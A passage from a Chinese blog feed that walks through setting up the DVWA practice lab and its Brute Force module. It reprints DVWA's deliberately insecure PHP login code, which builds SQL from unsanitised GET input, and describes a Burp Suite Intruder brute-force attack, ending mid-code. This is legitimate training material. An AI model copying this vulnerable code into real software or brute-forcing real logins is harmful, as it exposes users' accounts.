{
    "version": "https://jsonfeed.org/version/1",
    "title": "此时相望不相闻，愿逐月华流照君 • All posts by \"web\" category",
    "description": "",
    "home_page_url": "https://vvwwvv.cn",
    "items": [
        {
            "id": "https://vvwwvv.cn/2023/11/14/web/DVWA/",
            "url": "https://vvwwvv.cn/2023/11/14/web/DVWA/",
            "title": "web安全初探（）",
            "date_published": "2023-11-14T11:23:15.000Z",
            "content_html": "<h1 id=\"环境搭建\"><a class=\"anchor\" href=\"#环境搭建\">#</a> 环境搭建：</h1>\n<h2 id=\"1dvwa漏洞系统搭建\"><a class=\"anchor\" href=\"#1dvwa漏洞系统搭建\">#</a> 1.DVWA 漏洞系统搭建</h2>\n<p><code>DVWA(Damn Vulnerable Web Application)</code>  是一个用来进行安全脆弱性鉴定的 <code>PHP/MySQL</code>   <code>Web</code>  应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助 web 开发者更好的理解 web 应用安全防范的过程</p>\n<p>DVWA 共有十个模块，分别是:</p>\n<ul>\n<li>Brute Force（暴力（破解）</li>\n<li>Command Injection（命令行注入）</li>\n<li>CSRF（跨站请求伪造）</li>\n<li>File Inclusion（文件包含）</li>\n<li>File Upload（文件上传）</li>\n<li>Insecure CAPTCHA （不安全的验证码）</li>\n<li>SQL Injection（SQL 注入）</li>\n<li>SQL Injection（Blind）（SQL 盲注）</li>\n<li>XSS（Reflected）（反射型跨站脚本）</li>\n<li>XSS（Stored）（存储型跨站脚本）</li>\n</ul>\n<p>同时每个模块的代码都有 4 种安全等级： <code>Low</code> 、 <code>Medium</code> 、 <code>High</code> 、 <code>Impossible</code> 。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理</p>\n<h2 id=\"2windows下搭建dvwa\"><a class=\"anchor\" href=\"#2windows下搭建dvwa\">#</a> 2.Windows 下搭建 DVWA</h2>\n<h3 id=\"1下载并解压\"><a class=\"anchor\" href=\"#1下载并解压\">#</a> 1. 下载并解压：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpZ2luaW5qYS9EVldB\">https://github.com/digininja/DVWA</span></p>\n<h3 id=\"2利用phpstudy搭建web服务器\"><a class=\"anchor\" href=\"#2利用phpstudy搭建web服务器\">#</a> 2. 利用 phpstudy 搭建 web 服务器</h3>\n<h3 id=\"3将dvwa放入本地站点目录phpstudy中\"><a class=\"anchor\" href=\"#3将dvwa放入本地站点目录phpstudy中\">#</a> 3. 将 DVWA 放入本地站点目录（phpstudy）中</h3>\n<p>将解压出来的文件放入 <code>D:\\CTF\\phpStudy_64\\phpstudy_pro\\WWW</code>  目录下</p>\n<p>【这里有个问题：以前的数据库和 phpstudy 的数据库都默认是 3306 端口，导致冲突无法启动】</p>\n<h2 id=\"3安装并配置dvwa\"><a class=\"anchor\" href=\"#3安装并配置dvwa\">#</a> 3. 安装并配置 DVWA</h2>\n<h3 id=\"1修改配置文件\"><a class=\"anchor\" href=\"#1修改配置文件\">#</a> 1. 修改配置文件</h3>\n<p>在目录 <code>D:\\CTF\\phpStudy_64\\phpstudy_pro\\WWW\\DVWA-master\\config</code>  下将 <code>config.inc.php.dist</code>  重名命为 <code> config.inc.php</code></p>\n<p>然后将修改其内部代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_DVWA</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_server'</span> <span class=\"token punctuation\">]</span>   <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'127.0.0.1'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_database'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'dvwa'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_user'</span> <span class=\"token punctuation\">]</span>     <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_password'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$_DVWA</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'db_port'</span><span class=\"token punctuation\">]</span>      <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'3306'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"2安装dvwa\"><a class=\"anchor\" href=\"#2安装dvwa\">#</a> 2. 安装 DVWA</h3>\n<p>打开浏览器，输入 <code>http://127.0.0.1/DVWA-master/index.php</code>  进入，选择左侧的 <code>Setup/Reset DB</code>  选项，在最下方点击 <code>Create/Reset Database</code> ，如果提示 <code>Setup successful!</code>  即安装成功，然后会显示登录页面</p>\n<h3 id=\"3登录dvwa\"><a class=\"anchor\" href=\"#3登录dvwa\">#</a> 3. 登录 DVWA</h3>\n<p>使用浏览器访问 <code>http://127.0.0.1/DVWA-master/</code> ，输入用户名 <code>admin</code> ，密码 <code>password</code>  即可登录</p>\n<p>参考 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jampra2suZ2l0aHViLmlvL2luc3RhbGwtRFZXQS8=\">https://cjjkkk.github.io/install-DVWA/</span></p>\n<p>参考 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xOTg0MjIuaHRt\">https://www.jb51.net/article/198422.htm</span></p>\n<h1 id=\"1brute-force\"><a class=\"anchor\" href=\"#1brute-force\">#</a> 1.Brute Force</h1>\n<h2 id=\"1等级low\"><a class=\"anchor\" href=\"#1等级low\">#</a> 1. 等级：Low</h2>\n<p>在 DVWA 文件里可找到源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Get username</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token comment\">// Get password</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token variable\">$avatar</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"avatar\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area <span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token comment\">// Login failed</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token variable\">$html</span> <span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"&lt;pre>&lt;br />Username and/or password incorrect.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里主要部分是：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">//result 为查询结果</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以看到这里进行的是 get 方法传参，并没有对传入参数进行过滤，也没有其他的放爆破手段，所以这里我们可以进行爆破， <code>burpsuite</code>  里带有字典，可以尝试利用这个进行爆破</p>\n<h3 id=\"burp抓包\"><a class=\"anchor\" href=\"#burp抓包\">#</a> burp 抓包</h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/2L4%60RC%5D0%5DBHR1%294%5B%7E2%7BQNO1.png\" alt=\"\" /></p>\n<p>点击 Login，查看抓包结果：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%5DBZT%24%7E%60%600%40Z_02N0M%7E5%29V8Y.png\" alt=\"\" /></p>\n<p>然后进行 <code>send to intruder</code> ，在 intruder 页面下，清楚传入的变量：点击 <code>clear$</code> ，将 username 与 password 字段后面加入 <code>add$</code> ，设置 <code>attack type</code>  的值为 <code>cluster bomb</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/3TUYCS0%40_%7E%24_LG37%7E7BSE30.png\" alt=\"\" /></p>\n<p>在 payloads 下添加字典，payload1 这里手动添加几个用户名，payload2 也是手动加入几个密码进行验证，最后点击 start attack 即可开始暴力破解</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/BCSJRD3DQBAUTR09FVCV_%60D.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/%7BKWQ%24UN2GQU%29%407KH%7E%25O%24L0X.png\" alt=\"\" /></p>\n<p>破解结果可以看出来，其他的返回长度均为 4634，而只有一个长度为 4684，这个即为正确账户密码，其他都为失败时返回的内容，长度就不一样</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/R%40A39IB%5BO3D%5DPYAGI%5D%5BJJBM.png\" alt=\"\" /></p>\n<p>利用这个登录，发现能够成功登录：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/6GVR%5BG6AYH%289A%60_%25%40WY72%24F.png\" alt=\"\" /></p>\n<h2 id=\"2等级medium\"><a class=\"anchor\" href=\"#2等级medium\">#</a> 2. 等级： <code>Medium</code></h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>p</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token comment\">// Check the database</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token variable\">$query</span>  <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"SELECT * FROM `users` WHERE user = '<span class=\"token interpolation\"><span class=\"token variable\">$user</span></span>' AND password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass</span></span>';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$query</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token variable\">$row</span>    <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$result</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 